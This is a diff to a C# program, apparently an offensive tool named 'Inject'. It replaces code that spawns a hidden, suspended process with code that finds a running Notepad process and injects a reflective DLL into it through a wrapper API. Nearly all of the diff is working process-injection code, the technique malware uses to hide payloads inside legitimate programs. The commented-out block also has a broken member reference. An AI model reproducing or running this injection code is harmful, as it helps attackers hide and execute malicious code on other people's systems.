@@ -3,6 +3,7 @@ using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
 using System.Linq;
+using System.Runtime.Remoting.Contexts;
 using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
@@ -40,34 +41,48 @@ namespace Inject
 
                 IntPtr hToken = IntPtr.Zero;
 
-                var creationParms = new ProcessCreationParameters()
+                /************* new processs***************/
+
+                //var creationParms = new ProcessCreationParameters()
+                //{
+                //    Command = cmd,
+                //    //
+                //    //
+                //    //RedirectOutput = true,
+                //    RedirectOutput = false,
+                //    CreateNoWindow = true,
+                //    CreateSuspended = true,
+                //};
+
+
+                //procResult = APIWrapper.CreateProcess(creationParms);
+                //Console.WriteLine($"[?] ProcessId = {procResult.ProcessId}");
+                //Console.WriteLine($"[?] ProcessHandle = {procResult.ProcessHandle}");
+                //Console.WriteLine($"[?] PipeHandle = {procResult.OutPipeHandle}");
+
+                ////APIWrapper.Inject(procResult.ProcessHandle, procResult.ThreadHandle, shellcode);
+                //var offset = WinAPI.Helper.ReflectiveLoaderHelper.GetReflectiveFunctionOffset(reflectiveDll, "ReflectiveFunction");
+                //APIWrapper.Inject(procResult.Handle, procResult.tr, reflectiveDll, offset);
+
+                //if (procResult.ProcessId != 0 && creationParms.RedirectOutput)
+                //{
+                //    var process = Process.GetProcessById(procResult.ProcessId);
+                //    Console.WriteLine("[+] Result :");
+                //    APIWrapper.ReadPipeToEnd(procResult.OutPipeHandle, output => Console.Write(output));
+                //}
+
+
+
+                /************* existing processs***************/
+                var process = Process.GetProcessesByName("Notepad").FirstOrDefault();
+                if (process == null)
                 {
-                    Command = cmd,
-                    //
-                    //
-                    //RedirectOutput = true,
-                    RedirectOutput = false,
-                    CreateNoWindow = true,
-                    CreateSuspended = true,
-                };
-
-
-                procResult = APIWrapper.CreateProcess(creationParms);
-
-                Console.WriteLine($"[?] ProcessId = {procResult.ProcessId}");
-                Console.WriteLine($"[?] ProcessHandle = {procResult.ProcessHandle}");
-                Console.WriteLine($"[?] PipeHandle = {procResult.OutPipeHandle}");
-
-                //APIWrapper.Inject(procResult.ProcessHandle, procResult.ThreadHandle, shellcode);
-                var offset = WinAPI.Helper.ReflectiveLoaderHelper.GetReflectiveFunctionOffset(reflectiveDll, "ReflectiveFunction");
-                APIWrapper.Inject(procResult.ProcessHandle, procResult.ThreadHandle, reflectiveDll, offset);
-
-                if (procResult.ProcessId != 0 && creationParms.RedirectOutput)
-                {
-                    var process = Process.GetProcessById(procResult.ProcessId);
-                    Console.WriteLine("[+] Result :");
-                    APIWrapper.ReadPipeToEnd(procResult.OutPipeHandle, output => Console.Write(output));
+                    return;
                 }
+
+                var offset = WinAPI.Helper.ReflectiveLoaderHelper.GetReflectiveFunctionOffset(reflectiveDll, "ReflectiveFunction");
+                APIWrapper.Inject(process.Handle, IntPtr.Zero, reflectiveDll, offset);
+
             }
             catch (Exception ex)
             {
